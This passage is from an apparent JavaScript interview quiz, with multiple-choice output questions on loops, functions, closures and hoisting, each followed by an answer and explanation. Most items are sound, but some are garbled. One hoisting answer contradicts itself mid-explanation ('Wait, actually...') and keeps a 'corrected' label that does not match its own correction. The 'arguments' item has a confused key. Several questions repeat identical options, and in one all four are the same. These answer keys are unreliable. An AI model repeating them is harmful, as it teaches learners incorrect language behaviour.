  i--;
} while (i > 0 && i < 3);
```

- A) `5`, `4`, `3`, `2`, `1`
- B) `5`
- C) Nothing — the condition is false from the start
- D) `5`, `4`, `3`

**Answer: B) `5`**

**Explanation:** A `do...while` loop **always executes at least once** before checking the condition. After printing `5`, `i` becomes `4`. The condition `4 > 0 && 4 < 3` is `false`, so the loop stops. Only `5` is logged.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the difference between `for...of` and `for...in`?

```javascript
const arr = ['a', 'b', 'c'];
arr.custom = 'extra';

for (const val of arr) process.stdout.write(val + ' ');
console.log();
for (const key in arr) process.stdout.write(key + ' ');
```

- A) `a b c`, `0 1 2`
- B) `a b c`, `0 1 2 custom`
- C) `0 1 2`, `a b c`
- D) `a b c extra`, `0 1 2`

**Answer: B) `a b c`, `0 1 2 custom`**

**Explanation:** `for...of` iterates over **values** of iterable objects (strings, arrays, Maps, Sets). `for...in` iterates over **all enumerable property keys** — including non-index properties like `custom`. Never use `for...in` to iterate arrays; use `for...of` or `forEach` instead.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a labeled `break` do?

```javascript
outer: for (let i = 0; i < 3; i++) {
  for (let j = 0; j < 3; j++) {
    if (j === 1) break outer;
    console.log(i, j);
  }
}
```

- A) `0 0`, `1 0`, `2 0`
- B) `0 0`
- C) `0 0`, `0 1`, `0 2`, `1 0`, `1 1`, `1 2`, `2 0`, `2 1`, `2 2`
- D) `0 0`, `1 0`

**Answer: B) `0 0`**

**Explanation:** `break outer` breaks out of the **outer** labeled loop entirely, not just the inner one. When `i=0, j=1`, `break outer` is triggered, immediately exiting both loops. Only `0 0` is printed before the break.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of `for...of` iterating over a string?

```javascript
const emoji = 'Hi😀';
const chars = [];
for (const char of emoji) {
  chars.push(char);
}
console.log(chars.length);
console.log(emoji.length);
```

- A) `4`, `4`
- B) `3`, `4`
- C) `4`, `5`
- D) `3`, `5`

**Answer: B) `3`, `4`**

**Explanation:** `for...of` iterates Unicode code points correctly — the emoji `😀` is a single character. `chars.length` is `3` ('H', 'i', '😀'). However, `emoji.length` is `4` because `length` counts UTF-16 code units, and the emoji takes 2 code units (a surrogate pair).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `while` with `break` and `continue` produce?

```javascript
let i = 0;
let sum = 0;
while (i < 10) {
  i++;
  if (i % 2 === 0) continue;
  if (i > 7) break;
  sum += i;
}
console.log(sum);
```

- A) `25`
- B) `16`
- C) `9`
- D) `1 + 3 + 5 + 7 = 16`

**Answer: B) `16`**

**Explanation:** The loop adds odd numbers below 8. `continue` skips even numbers. `break` exits when `i > 7`. Odd numbers added: `1, 3, 5, 7` → sum = `16`. (`9` is odd but `i > 7` triggers break before adding).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a `switch` with multiple cases sharing a block produce?

```javascript
const fruit = 'orange';
switch (fruit) {
  case 'apple':
  case 'pear':
    console.log('pome fruit');
    break;
  case 'orange':
  case 'lemon':
    console.log('citrus fruit');
    break;
  default:
    console.log('other');
}
```

- A) `"citrus fruit"`, `"other"`
- B) `"citrus fruit"`
- C) `"other"`
- D) `"pome fruit"`, `"citrus fruit"`

**Answer: B) `"citrus fruit"`**

**Explanation:** Multiple cases can share a block by stacking them without `break`. `'orange'` matches `case 'orange'`, falls through to `case 'lemon'`\'s block (they share the same code), logs `"citrus fruit"`, then hits `break`. This is intentional fall-through for grouping.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of nested loops with `continue`?

```javascript
for (let i = 1; i <= 3; i++) {
  for (let j = 1; j <= 3; j++) {
    if (i === j) continue;
    console.log(i, j);
  }
}
```

- A) 9 pairs (all combinations)
- B) 6 pairs (all except where i === j)
- C) 3 pairs (only where i === j)
- D) 0 pairs

**Answer: B) 6 pairs (all except where i === j)**

**Explanation:** `continue` skips the current iteration of the **innermost** loop when `i === j`. The pairs `(1,1)`, `(2,2)`, `(3,3)` are skipped. The remaining 6 pairs `(1,2),(1,3),(2,1),(2,3),(3,1),(3,2)` are logged.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `try...finally` return in a loop?

```javascript
function test() {
  for (let i = 0; i < 3; i++) {
    try {
      if (i === 1) return 'returned at 1';
    } finally {
      console.log('finally:', i);
    }
  }
  return 'done';
}
console.log(test());
```

- A) `"finally: 0"`, `"finally: 1"`, `"finally: 2"`, `"done"`
- B) `"finally: 0"`, `"finally: 1"`, `"returned at 1"`
- C) `"finally: 1"`, `"returned at 1"`
- D) `"finally: 0"`, `"returned at 1"`

**Answer: B) `"finally: 0"`, `"finally: 1"`, `"returned at 1"`**

**Explanation:** `finally` always runs, even when `return` is encountered. When `i=0`: `finally` logs `"finally: 0"`, no return. When `i=1`: `return` is hit, but `finally` still runs first (`"finally: 1"`), then the function returns `"returned at 1"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `for...in` return for inherited properties?

```javascript
function Base() {
  this.own = 1;
}
Base.prototype.inherited = 2;
const obj = new Base();
const keys = [];
for (const key in obj) keys.push(key);
const ownKeys = Object.keys(obj);
console.log(keys, ownKeys);
```

- A) `["own"]`, `["own"]`
- B) `["own","inherited"]`, `["own"]`
- C) `["own","inherited"]`, `["own","inherited"]`
- D) `["inherited"]`, `["own"]`

**Answer: B) `["own","inherited"]`, `["own"]`**

**Explanation:** `for...in` iterates over all enumerable properties including **inherited** ones. `Object.keys()` only returns the object\'s own enumerable properties. When iterating with `for...in`, use `hasOwnProperty` check (`if (obj.hasOwnProperty(key))`) to filter out inherited properties.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of the ternary operator used as a statement?

```javascript
let x = 10;
x > 5 ? console.log('big') : console.log('small');
const result = x > 5 ? x * 2 : x / 2;
console.log(result);
```

- A) `"small"`, `5`
- B) `"big"`, `20`
- C) `"big"`, `5`
- D) Nothing, `20`

**Answer: B) `"big"`, `20`**

**Explanation:** The ternary operator can be used as a statement (though this is generally discouraged for readability). `10 > 5` is true → `console.log('big')` is executed. The second ternary evaluates `x * 2 = 20` and assigns it to `result`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 8. Functions

<br>

## Q. A function is called before it is defined. What is the output?

```javascript
console.log(greet("Alice"));

function greet(name) {
  return "Hello, " + name;
}
```

- A) `ReferenceError: greet is not defined`
- B) `TypeError: greet is not a function`
- C) `"Hello, Alice"`
- D) `undefined`

**Answer: C) `"Hello, Alice"`**

**Explanation:** Function declarations are fully hoisted — both the name and body. You can call them before they appear in code. This is different from function expressions (`const greet = function(){}`) which are not hoisted.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of this function with default parameters?

```javascript
function createUser(name, role = "viewer", active = true) {
  return `${name} | ${role} | ${active}`;
}
console.log(createUser("Alice"));
console.log(createUser("Bob", undefined, false));
```

- A) `"Alice | viewer | true"`, `"Bob | viewer | false"`
- B) `"Alice | undefined | undefined"`, `"Bob | undefined | false"`
- C) `"Alice | viewer | true"`, `"Bob | undefined | false"`
- D) Error on both calls

**Answer: A) `"Alice | viewer | true"`, `"Bob | viewer | false"`**

**Explanation:** When a parameter is `undefined` (or omitted), the default value is used. Passing `undefined` explicitly still triggers the default. Passing `false` explicitly overrides the default.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `arguments` object contain?

```javascript
function sum() {
  let total = 0;
  for (let i = 0; i < arguments.length; i++) {
    total += arguments[i];
  }
  return total;
}
console.log(sum(1, 2, 3, 4, 5));
console.log(Array.isArray(arguments));
```

- A) `15`, `true`
- B) `15`, `false` — then ReferenceError on the second log
- C) `NaN`, `false`
- D) `15`, and the second line throws `ReferenceError`

**Answer: D) `15`, and the second line throws `ReferenceError`**

**Explanation:** Inside `sum()`, `arguments` works fine. Outside a function, `arguments` is not defined → `ReferenceError`. The `arguments` object is array-like (has `length`, numeric indices) but is NOT an actual array — `Array.isArray(arguments)` inside the function returns `false`. Use rest parameters (`...args`) in modern code.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does an IIFE (Immediately Invoked Function Expression) do?

```javascript
const counter = (function() {
  let count = 0;
  return {
    inc: () => ++count,
    get: () => count
  };
})();
counter.inc();
counter.inc();
console.log(counter.get());
console.log(typeof count);
```

- A) `2`, `"number"`
- B) `2`, `"undefined"`
- C) `0`, `"undefined"`
- D) `ReferenceError`

**Answer: B) `2`, `"undefined"`**

**Explanation:** The IIFE creates a private `count` variable inaccessible from outside. The returned object provides controlled access. `counter.inc()` increments twice → `2`. `typeof count` outside the IIFE → `"undefined"` (undeclared variable, `typeof` is safe). This is the classic module pattern.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a higher-order function return?

```javascript
function multiplier(factor) {
  return function(number) {
    return number * factor;
  };
}
const double = multiplier(2);
const triple = multiplier(3);
console.log(double(5));
console.log(triple(5));
console.log(double(triple(4)));
```

- A) `10`, `15`, `24`
- B) `10`, `15`, `24`
- C) `25`, `15`, `24`
- D) `10`, `15`, `12`

**Answer: A) `10`, `15`, `24`**

**Explanation:** `multiplier` is a higher-order function — it returns a function. `double(5)` → `5*2 = 10`. `triple(5)` → `5*3 = 15`. `double(triple(4))` → `triple(4) = 12`, then `double(12) = 24`. Each closure captures its own `factor` value.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a recursive function return?

```javascript
function factorial(n) {
  if (n <= 1) return 1;
  return n * factorial(n - 1);
}
console.log(factorial(5));
console.log(factorial(0));
```

- A) `120`, `0`
- B) `120`, `1`
- C) `120`, `undefined`
- D) `24`, `1`

**Answer: B) `120`, `1`**

**Explanation:** `factorial(5) = 5 * 4 * 3 * 2 * 1 = 120`. `factorial(0)` hits the base case `n <= 1` immediately and returns `1` (0! = 1 by mathematical convention). Recursive functions must have a base case to prevent infinite recursion and stack overflow.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does currying produce?

```javascript
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return function(...args2) {
      return curried.apply(this, args.concat(args2));
    };
  };
}
const add = curry((a, b, c) => a + b + c);
console.log(add(1)(2)(3));
console.log(add(1, 2)(3));
console.log(add(1)(2, 3));
```

- A) `6`, `6`, `6`
- B) `6`, `undefined`, `6`
- C) `1`, `6`, `6`
- D) `TypeError`, `6`, `6`

**Answer: A) `6`, `6`, `6`**

**Explanation:** Currying transforms a function with multiple arguments into a sequence of functions each taking one (or more) arguments. All three call styles produce `6` because `curry` checks if enough arguments are provided (`args.length >= fn.length`). If not, it returns another partial function.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `Function.length` property return?

```javascript
function noParams() {}
function twoParams(a, b) {}
function withDefault(a, b = 10) {}
function withRest(a, ...rest) {}
console.log(noParams.length, twoParams.length, withDefault.length, withRest.length);
```

- A) `0`, `2`, `2`, `2`
- B) `0`, `2`, `1`, `1`
- C) `0`, `2`, `2`, `1`
- D) `0`, `2`, `1`, `2`

**Answer: B) `0`, `2`, `1`, `1`**

**Explanation:** `Function.length` counts the number of **expected parameters**, excluding parameters with default values and rest parameters. `noParams.length = 0`, `twoParams.length = 2`, `withDefault.length = 1` (only `a` counts), `withRest.length = 1` (only `a` counts, rest is excluded).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a named function expression return for `fn.name`?

```javascript
const greet = function sayHello(name) {
  return `Hello, ${name}!`;
};
console.log(greet('Alice'));
console.log(greet.name);
console.log(typeof sayHello);
```

- A) `"Hello, Alice!"`, `"greet"`, `"function"`
- B) `"Hello, Alice!"`, `"sayHello"`, `"undefined"`
- C) `"Hello, Alice!"`, `"greet"`, `"undefined"`
- D) `"Hello, Alice!"`, `"sayHello"`, `"function"`

**Answer: B) `"Hello, Alice!"`, `"sayHello"`, `"undefined"`**

**Explanation:** In a named function expression, the function\'s `name` property is its own name (`"sayHello"`), not the variable it\'s assigned to. The name `sayHello` is only accessible **inside** the function body (useful for recursion). Outside, `typeof sayHello` is `"undefined"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a function with rest parameters and spread receive?

```javascript
function logAll(first, ...rest) {
  console.log(first);
  console.log(rest);
  console.log(rest.length);
}
const args = [1, 2, 3, 4];
logAll(...args);
```

- A) `1`, `[2,3,4]`, `3`
- B) `[1,2,3,4]`, `[]`, `0`
- C) `1`, `[2,3,4]`, `4`
- D) `1`, `2`, `3`

**Answer: A) `1`, `[2,3,4]`, `3`**

**Explanation:** The spread operator `...args` expands the array into individual arguments. `first` captures `1`. The rest parameter `...rest` collects the remaining arguments `[2, 3, 4]` into a real array. `rest.length` is `3`. Rest parameters must always be last in the parameter list.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of a function with a default parameter that has a side effect?

```javascript
let callCount = 0;
function getDefault() {
  callCount++;
  return 'default';
}
function greet(name = getDefault()) {
  return `Hello, ${name}!`;
}
greet('Alice');
greet('Bob');
greet();
console.log(callCount);
```

- A) `0`
- B) `1`
- C) `2`
- D) `3`

**Answer: B) `1`**

**Explanation:** Default parameter expressions are evaluated **lazily** — only when the parameter is actually `undefined`. The first two calls provide explicit values, so `getDefault()` is never called. The third call omits the argument → `getDefault()` is called once. `callCount = 1`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Function.prototype.toString` return?

```javascript
function add(a, b) {
  return a + b;
}
const src = add.toString();
console.log(typeof src);
console.log(src.includes('return a + b'));
```

- A) `"function"`, `false`
- B) `"string"`, `true`
- C) `"object"`, `true`
- D) `"string"`, `false`

**Answer: B) `"string"`, `true`**

**Explanation:** `Function.prototype.toString()` returns the source code of the function as a **string** — including whitespace and comments as written. This can be used for serialization, documentation tools, or debugging. The result contains `'return a + b'` so `includes` returns `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a function returning another function (closure) produce?

```javascript
function makeAdder(x) {
  return function(y) {
    return x + y;
  };
}
const add5 = makeAdder(5);
const add10 = makeAdder(10);
console.log(add5(3));
console.log(add10(3));
console.log(add5 === add10);
```

- A) `8`, `13`, `true`
- B) `8`, `13`, `false`
- C) `5`, `10`, `false`
- D) `8`, `8`, `false`

**Answer: B) `8`, `13`, `false`**

**Explanation:** `makeAdder` is a closure factory. Each call creates a new function with its own `x` captured in a closure. `add5(3)` uses `x=5`: `5+3=8`. `add10(3)` uses `x=10`: `10+3=13`. `add5 !== add10` because they are distinct function objects created by separate calls.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## L2: Intermediate (Junior-Mid / Developer)

<br>

## # 8. Scope & Closures

<br>

## Q. A developer creates counter functions using closures. What does the following output?

```javascript
function makeCounter() {
  let count = 0;
  return {
    increment: () => ++count,
    decrement: () => --count,
    value: () => count
  };
}

const counter = makeCounter();
counter.increment();
counter.increment();
counter.decrement();
console.log(counter.value());
```

- A) `0`
- B) `1`
- C) `2`
- D) `3`

**Answer: B) `1`**

**Explanation:** The closure retains access to `count`. Starting at `0`: `increment()` → `1`, `increment()` → `2`, `decrement()` → `1`. `counter.value()` returns `1`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of this immediately invoked function?

```javascript
const result = (function() {
  let x = 10;
  return function(y) {
    return x + y;
  };
})();

console.log(result(5));
console.log(typeof x);
```

- A) `15`, `"number"`
- B) `15`, `"undefined"`
- C) `NaN`, `"undefined"`
- D) `ReferenceError`

**Answer: B) `15`, `"undefined"`**

**Explanation:** The IIFE runs immediately, and `result` holds the inner function. `x` is enclosed in the IIFE\'s scope — it\'s inaccessible outside, so `typeof x` returns `"undefined"` (not a ReferenceError because `typeof` on an undeclared variable is safe).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a closure capture — value or reference?

```javascript
function makeMultipliers() {
  const fns = [];
  for (let i = 1; i <= 3; i++) {
    fns.push(() => i * 10);
  }
  return fns;
}
const [times1, times2, times3] = makeMultipliers();
console.log(times1(), times2(), times3());
```

- A) `10`, `10`, `10`
- B) `30`, `30`, `30`
- C) `10`, `20`, `30`
- D) `undefined`, `undefined`, `undefined`

**Answer: C) `10`, `20`, `30`**

**Explanation:** Because `let` is block-scoped, each loop iteration creates a new `i` binding. Each arrow function closes over its own `i` (1, 2, 3). With `var`, all closures would share the same `i` (→ `40, 40, 40` after the loop ends at 4). This demonstrates how `let` fixed the classic closure-in-loop bug.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the module pattern using closure produce?

```javascript
const BankAccount = (function() {
  let balance = 0;
  return {
    deposit(amount) { balance += amount; },
    withdraw(amount) { if (amount <= balance) balance -= amount; },
    getBalance() { return balance; }
  };
})();
BankAccount.deposit(100);
BankAccount.deposit(50);
BankAccount.withdraw(30);
console.log(BankAccount.getBalance());
console.log(BankAccount.balance);
```

- A) `120`, `120`
- B) `120`, `undefined`
- C) `150`, `undefined`
- D) `120`, `0`

**Answer: B) `120`, `undefined`**

**Explanation:** The IIFE creates a private `balance` variable. `100 + 50 - 30 = 120`. `BankAccount.balance` is `undefined` — `balance` is not exposed on the returned object. This is the fundamental value of closures for encapsulation: hiding internal state.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does lexical scoping mean in this example?

```javascript
const name = 'Global';
function outer() {
  const name = 'Outer';
  return function inner() {
    return name;
  };
}
const fn = outer();
const name2 = 'Reassigned';
console.log(fn());
```

- A) `"Global"`
- B) `"Outer"`
- C) `"Reassigned"`
- D) `undefined`

**Answer: B) `"Outer"`**

**Explanation:** Lexical scoping means a function\'s scope is determined by where it is **defined**, not where it is **called**. `inner` was defined inside `outer`, so it closes over `outer`\'s `name = 'Outer'`. Even after `outer` returns and a new `name2` is declared, `fn()` still refers to `'Outer'`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does partial application using closures produce?

```javascript
function partial(fn, ...presetArgs) {
  return function(...laterArgs) {
    return fn(...presetArgs, ...laterArgs);
  };
}
const multiply = (a, b, c) => a * b * c;
const double = partial(multiply, 2);
const sixTimes = partial(multiply, 2, 3);
console.log(double(3, 4));
console.log(sixTimes(5));
```

- A) `24`, `30`
- B) `24`, `30`
- C) `6`, `30`
- D) `24`, `10`

**Answer: A) `24`, `30`**

**Explanation:** Partial application pre-fills some arguments. `double(3, 4)` → `multiply(2, 3, 4) = 24`. `sixTimes(5)` → `multiply(2, 3, 5) = 30`. Closures make this possible by preserving `presetArgs` across calls. Unlike `bind`, this pattern allows remaining args to be supplied flexibly.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of a closure-based memoization?

```javascript
function memoize(fn) {
  const cache = {};
  return function(n) {
    if (n in cache) {
      return cache[n];
    }
    return (cache[n] = fn(n));
  };
}
let calls = 0;
const square = memoize(n => { calls++; return n * n; });
console.log(square(4), square(4), square(5));
console.log(calls);
```

- A) `16 16 25`, `3`
- B) `16 16 25`, `2`
- C) `16 undefined 25`, `2`
- D) `16 16 25`, `1`

**Answer: B) `16 16 25`, `2`**

**Explanation:** The cache (closed over) persists between calls. `square(4)` → cache miss, calls `fn(4)`, stores `16`. `square(4)` again → cache hit, returns `16` without calling `fn`. `square(5)` → cache miss, calls `fn(5)`. Total `fn` calls: `2`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a closure accumulate?

```javascript
function makeAccumulator(initial = 0) {
  let sum = initial;
  return function(value) {
    sum += value;
    return sum;
  };
}
const acc1 = makeAccumulator();
const acc2 = makeAccumulator(10);
console.log(acc1(5));
console.log(acc1(3));
console.log(acc2(5));
console.log(acc1(2));
```

- A) `5`, `8`, `15`, `10`
- B) `5`, `8`, `15`, `10`
- C) `5`, `8`, `15`, `10`
- D) `5`, `8`, `15`, `10`

**Answer: A) `5`, `8`, `15`, `10`**

**Explanation:** Each call to `makeAccumulator` creates an independent `sum` variable. `acc1` starts at 0: 0+5=5, 5+3=8, then 8+2=10. `acc2` starts at 10: 10+5=15. The two accumulators do not share state.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What happens when a closure captures a variable that changes?

```javascript
function example() {
  let x = 10;
  const getX = () => x;
  const setX = (val) => { x = val; };
  return { getX, setX };
}
const { getX, setX } = example();
console.log(getX());
setX(42);
console.log(getX());
```

- A) `10`, `10` — closures take a snapshot of the value
- B) `10`, `42` — closures reference the variable, not its value
- C) `undefined`, `42`
- D) `10`, `undefined`

**Answer: B) `10`, `42` — closures reference the variable, not its value**

**Explanation:** Closures capture **variables by reference**, not by value. Both `getX` and `setX` close over the same `x` variable. When `setX(42)` updates `x`, `getX()` reflects the change. This is why closures can implement shared mutable state.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a closure over a loop variable produce when using `var` vs `let`?

```javascript
const varFns = [];
for (var i = 0; i < 3; i++) {
  varFns.push(() => i);
}
const letFns = [];
for (let j = 0; j < 3; j++) {
  letFns.push(() => j);
}
console.log(varFns.map(f => f()));
console.log(letFns.map(f => f()));
```

- A) `[0,1,2]`, `[0,1,2]`
- B) `[3,3,3]`, `[0,1,2]`
- C) `[0,1,2]`, `[3,3,3]`
- D) `[3,3,3]`, `[3,3,3]`

**Answer: B) `[3,3,3]`, `[0,1,2]`**

**Explanation:** `var` creates a single `i` variable shared by all closures. After the loop, `i = 3` → all functions return `3`. `let` creates a new `j` binding per iteration → each closure captures a different value (0, 1, 2). This is the canonical example of why `let` was introduced.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a recursive closure compute?

```javascript
const fibonacci = (function() {
  const memo = {};
  return function fib(n) {
    if (n <= 1) return n;
    if (n in memo) return memo[n];
    return (memo[n] = fib(n - 1) + fib(n - 2));
  };
})();
console.log(fibonacci(10));
console.log(fibonacci(0), fibonacci(1));
```

- A) `55`, `0`, `1`
- B) `89`, `0`, `1`
- C) `55`, `1`, `1`
- D) `45`, `0`, `1`

**Answer: A) `55`, `0`, `1`**

**Explanation:** The memoized Fibonacci function caches results. Fibonacci sequence: 0,1,1,2,3,5,8,13,21,34,55. `fibonacci(10) = 55`. `fibonacci(0) = 0`, `fibonacci(1) = 1` (base cases). The IIFE creates a private `memo` cache that persists across all calls.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does an event listener using a closure produce?

```javascript
function attachListeners() {
  const buttons = ['A', 'B', 'C'];
  return buttons.map((label, i) => {
    return {
      label,
      handler: () => `Button ${label} at index ${i} clicked`
    };
  });
}
const listeners = attachListeners();
console.log(listeners[0].handler());
console.log(listeners[2].handler());
```

- A) `"Button A at index 0 clicked"`, `"Button C at index 2 clicked"`
- B) `"Button C at index 2 clicked"`, `"Button C at index 2 clicked"`
- C) `"Button A at index 0 clicked"`, `"Button A at index 0 clicked"`
- D) `ReferenceError`

**Answer: A) `"Button A at index 0 clicked"`, `"Button C at index 2 clicked"`**

**Explanation:** `map` with arrow functions correctly captures each iteration\'s `label` and `i` via closures. Since `map` creates a new scope for each callback, each closure captures its specific values. This is the recommended pattern for attaching handlers to dynamically generated elements.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 9. Hoisting

<br>

## Q. What is the output of the following code?

```javascript
console.log(foo());
console.log(bar());

function foo() { return "foo"; }
const bar = function() { return "bar"; };
```

- A) `"foo"`, `"bar"`
- B) `"foo"`, `TypeError: bar is not a function`
- C) `ReferenceError`, `"bar"`
- D) `undefined`, `undefined`

**Answer: B) `"foo"`, `TypeError: bar is not a function`**

**Explanation:** Function declarations are fully hoisted, so `foo()` works. `bar` is a `const` variable in the Temporal Dead Zone (TDZ) at the time of the call, but since we call `bar()` after its declaration line... Wait, actually `const bar` is declared but its value (function expression) isn\'t assigned yet at hoisting time. At the point `console.log(bar())` is called, `bar` is in TDZ and will throw a `ReferenceError`. However, if `var bar` were used, it would be `TypeError`. With `const`, it\'s actually `ReferenceError: Cannot access 'bar' before initialization`.

**Corrected Answer: B) — Note:** With `const`, accessing `bar` before its declaration throws `ReferenceError: Cannot access 'bar' before initialization` due to the Temporal Dead Zone. With `var`, it would be `TypeError: bar is not a function`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the following output?

```javascript
var x = "global";

function outer() {
  console.log(x);
  var x = "local";
  console.log(x);
}

outer();
console.log(x);
```

- A) `"global"`, `"local"`, `"global"`
- B) `"global"`, `"local"`, `"local"`
- C) `undefined`, `"local"`, `"global"`
- D) `ReferenceError`, `"local"`, `"global"`

**Answer: C) `undefined`, `"local"`, `"global"`**

**Explanation:** Inside `outer()`, the local `var x` is hoisted to the top of the function, shadowing the global. At the first `console.log(x)`, `x` is hoisted but not yet assigned → `undefined`. After assignment, it\'s `"local"`. The global `x` remains `"global"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. Are class declarations hoisted?

```javascript
try {
  const obj = new MyClass();
} catch (e) {
  console.log(e.constructor.name);
}
class MyClass {
  greet() { return 'hello'; }
}
const obj2 = new MyClass();
console.log(obj2.greet());
```

- A) No error, `"hello"`
- B) `"ReferenceError"`, `"hello"`
- C) `"TypeError"`, `"hello"`
- D) `"SyntaxError"`, `"hello"`

**Answer: B) `"ReferenceError"`, `"hello"`**

**Explanation:** Class declarations are hoisted but NOT initialized — they are in the Temporal Dead Zone until the declaration is reached. Accessing a class before its declaration throws `ReferenceError`. After the declaration, the class can be instantiated normally. This is the same behavior as `let`/`const`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the hoisting behavior of `var` versus `function` declarations?

```javascript
console.log(typeof myVar);
console.log(typeof myFunc);
var myVar = 'hello';
function myFunc() { return 'world'; }
console.log(typeof myVar);
console.log(typeof myFunc);
```

- A) `"undefined"`, `"undefined"`, `"string"`, `"function"`
- B) `"undefined"`, `"function"`, `"string"`, `"function"`
- C) `"string"`, `"function"`, `"string"`, `"function"`
- D) `ReferenceError`, `"function"`, `"string"`, `"function"`

**Answer: B) `"undefined"`, `"function"`, `"string"`, `"function"`**

**Explanation:** `var` is hoisted and initialized to `undefined`. Function declarations are **fully** hoisted (name AND body). Before any code runs, `myFunc` is already a complete function. After their declarations are reached, `myVar` becomes `"string"` and `myFunc` remains `"function"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What happens when multiple `var` declarations exist for the same name?

```javascript
var x = 1;
var x = 2;
var x = 3;
console.log(x);
function test() {
  var y = 1;
  var y = 2;
  console.log(y);
}
test();
```

- A) `SyntaxError` — duplicate var declarations
- B) `3`, `2`
- C) `1`, `1`
- D) `3`, `1`

**Answer: B) `3`, `2`**

**Explanation:** `var` allows duplicate declarations — later declarations effectively re-assign the variable. This is one of `var`\'s problematic behaviors. `let` and `const` throw `SyntaxError` for duplicate declarations in the same scope. The last assignment wins.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of hoisting with a function declaration inside a conditional?

```javascript
console.log(typeof greet);
if (true) {
  function greet() { return 'hello'; }
}
console.log(typeof greet);
```

- A) `"undefined"`, `"function"` — function hoisted after block
- B) `"function"`, `"function"` — fully hoisted before block
- C) `"undefined"`, `"undefined"` — function declarations in blocks are not hoisted
- D) Behavior is implementation-defined (varies between strict and sloppy mode)

**Answer: D) Behavior is implementation-defined (varies between strict and sloppy mode)**

**Explanation:** Function declarations inside blocks behave differently in strict vs. sloppy mode, and also vary between environments. In strict mode, block-level function declarations are scoped to the block. In sloppy mode, behavior is engine-specific. This is one reason to always use function expressions in blocks: `const greet = function() {}`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the hoisting order when `var` and `function` share a name?

```javascript
console.log(typeof foo);
var foo = 'variable';
function foo() { return 'function'; }
console.log(foo);
```

- A) `"undefined"`, `"variable"`
- B) `"function"`, `"variable"`
- C) `"variable"`, `"variable"`
- D) `SyntaxError` — duplicate declaration

**Answer: B) `"function"`, `"variable"`**

**Explanation:** Function declarations are hoisted above `var` declarations. Before execution: `foo` is the function. The `var foo` declaration is ignored (already declared by function), but the assignment `foo = 'variable'` runs. Before the assignment: `typeof foo` → `"function"`. After: `foo` → `"variable"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does accessing `let`/`const` in the TDZ specifically throw?

```javascript
function test() {
  try {
    console.log(x);
  } catch (e) {
    console.log(e instanceof ReferenceError);
    console.log(e.message.includes('Cannot access'));
  }
  let x = 5;
  console.log(x);
}
test();
```

- A) `true`, `false`, `5`
- B) `false`, `true`, `5`
- C) `true`, `true`, `5`
- D) `false`, `false`, `5`

**Answer: C) `true`, `true`, `5`**

**Explanation:** Accessing a `let` or `const` variable before its declaration throws a `ReferenceError`. The message typically says `"Cannot access 'x' before initialization"`. After the declaration line is passed, `x` is initialized to `5` and can be used normally. The TDZ exists to catch programming errors.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does hoisting produce with nested functions?

```javascript
function outer() {
  console.log(inner());
